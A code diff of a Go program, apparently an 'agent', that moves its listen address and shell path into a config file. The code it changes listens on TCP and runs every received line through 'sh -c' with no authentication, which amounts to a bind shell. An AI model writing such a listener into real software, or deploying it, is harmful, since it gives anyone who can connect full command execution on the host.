@@ -8,17 +8,16 @@ import (
 	"os"
 	"os/exec"
 	"strings"
-)
-
-const (
-	CONN_HOST = "0.0.0.0"
-	CONN_PORT = "9199"
-	COMMS     = CONN_HOST + ":" + CONN_PORT
-	SHELL     = "/bin/sh"
+	"agent/pkg/config"
 )
 
 func main() {
-	listener(COMMS)
+	err := config.ReadConfig()
+	if err != nil {
+		fmt.Println(err.Error())
+		return
+	}
+	listener(config.TcpAddr)
 }
 
 func listener(comms_data string) {
@@ -44,7 +43,7 @@ func listener(comms_data string) {
 func handleRequest(conn net.Conn) {
 	for {
 		message, _ := bufio.NewReader(conn).ReadString('\n')
-		out, err := exec.Command(SHELL, "-c", strings.TrimSuffix(message, "\n")).Output()
+		out, err := exec.Command(config.Shell, "-c", strings.TrimSuffix(message, "\n")).Output()
 
 		if err != nil {
 			fmt.Println("unable to run command,", conn, "%s\n", err)
